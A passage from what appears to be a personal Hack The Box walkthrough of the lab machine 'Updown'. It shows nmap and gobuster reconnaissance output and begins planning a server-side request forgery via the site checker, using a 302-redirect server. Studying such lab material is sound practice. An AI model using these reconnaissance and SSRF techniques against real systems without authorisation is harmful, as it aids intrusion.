@@ -1,0 +1,1235 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Zipping" href="../zipping/zipping.html" /><link rel="prev" title="Shared" href="../shared/shared.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Updown - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="updown.png" src="../../../../_images/updown.png" /></p>
+<section id="updown">
+<h1>Updown<a class="headerlink" href="#updown" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Nmap 7.92 scan initiated Thu Sep 15 15:13:04 2022 as: nmap -vvv -p 22,80 -sC -sV -oN scans/nmap.initial 10.10.11.177</span>
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.10.11.177
+Host<span class="w"> </span>is<span class="w"> </span>up,<span class="w"> </span>received<span class="w"> </span>conn-refused<span class="w"> </span><span class="o">(</span><span class="m">0</span>.028s<span class="w"> </span>latency<span class="o">)</span>.
+Scanned<span class="w"> </span>at<span class="w"> </span><span class="m">2022</span>-09-15<span class="w"> </span><span class="m">15</span>:13:04<span class="w"> </span>IST<span class="w"> </span><span class="k">for</span><span class="w"> </span>7s
+
+PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>REASON<span class="w">  </span>VERSION
+<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>syn-ack<span class="w"> </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.5<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-rsa<span class="w"> </span>AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0<span class="o">=</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ecdsa-sha2-nistp256<span class="w"> </span>AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI<span class="o">=</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="p">|</span>_ssh-ed25519<span class="w"> </span>AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
+<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>syn-ack<span class="w"> </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.41<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span><span class="w"> </span>http-methods:
+<span class="p">|</span>_<span class="w">  </span>Supported<span class="w"> </span>Methods:<span class="w"> </span>GET<span class="w"> </span>HEAD<span class="w"> </span>POST<span class="w"> </span>OPTIONS
+<span class="p">|</span>_http-title:<span class="w"> </span>Is<span class="w"> </span>my<span class="w"> </span>Website<span class="w"> </span>up<span class="w"> </span>?
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.41<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Read<span class="w"> </span>data<span class="w"> </span>files<span class="w"> </span>from:<span class="w"> </span>/usr/bin/../share/nmap
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+<span class="c1"># Nmap done at Thu Sep 15 15:13:11 2022 -- 1 IP address (1 host up) scanned in 7.62 seconds</span>
+</pre></div>
+</div>
+<p>Landing page shows siteisup.htb so we can start to look for subdomains of it with gobuster in the background. As this is running we can start playing with the site, we can use the website check to call our own box:<br />
+<img alt="siteisup.png" src="../../../../_images/siteisup.png" /></p>
+<p>It can call itself too:<br />
+<img alt="itself.png" src="../../../../_images/itself.png" /></p>
+<p>In the meantime gobuster found the dev.siteisup.htb subdomain, but it returns 403</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gobuster<span class="w"> </span>vhost<span class="w"> </span>-u<span class="w"> </span>siteisup.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/namelist.txt
+<span class="o">===============================================================</span>
+Gobuster<span class="w"> </span>v3.1.0
+by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">          </span>http://siteisup.htb
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">       </span>GET
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">      </span><span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">     </span>/usr/share/seclists/Discovery/DNS/namelist.txt
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">   </span>gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">      </span><span class="nv">10s</span>
+<span class="o">===============================================================</span>
+<span class="m">2022</span>/10/20<span class="w"> </span><span class="m">20</span>:20:18<span class="w"> </span>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>VHOST<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
+<span class="o">===============================================================</span>
+Found:<span class="w"> </span>dev.siteisup.htb<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">281</span><span class="o">]</span>
+Progress:<span class="w"> </span><span class="m">48788</span><span class="w"> </span>/<span class="w"> </span><span class="m">151266</span><span class="w"> </span><span class="o">(</span><span class="m">32</span>.25%<span class="o">)</span>
+</pre></div>
+</div>
+<p>We might also be able to connect to filtered ports behind a firewall?<br />
+Lets have nmap run on all ports just in case</p>
+<p>Can we get a response from dev.siteisup.htb from the health page?.. no<br />
+<img alt="isdown.png" src="../../../../_images/isdown.png" /></p>
+<p>since we receive connections on our own machine we can setup a server that will respond 302 redirect to wherever we want.</p>
